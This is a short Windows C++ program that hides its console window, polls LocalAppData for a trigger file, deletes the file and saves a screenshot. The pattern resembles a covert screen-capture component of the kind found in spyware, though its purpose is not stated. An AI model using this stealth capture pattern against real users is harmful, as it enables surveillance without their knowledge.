#include "api.h"
#pragma comment(lib , "API.lib")

int main() {
	FreeConsole();
	wchar_t PathToLocalAppData[MAX_PATH];
	ZeroMemory(PathToLocalAppData, sizeof(PathToLocalAppData));
	SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, PathToLocalAppData);
	std::wstring CheckPath = std::wstring(PathToLocalAppData) + L"\\abracadabra.txt";
	DWORD dwAttributes = INVALID_FILE_ATTRIBUTES;

	while (TRUE) {
		dwAttributes = GetFileAttributes(CheckPath.c_str());
		if (dwAttributes != INVALID_FILE_ATTRIBUTES) {
			DeleteFile(CheckPath.c_str());
			std::wstring ScreenPath = std::wstring(PathToLocalAppData) + L"\\1.png";
			SaveScreen(ScreenPath.c_str());
		}
		Sleep(100);
	}
}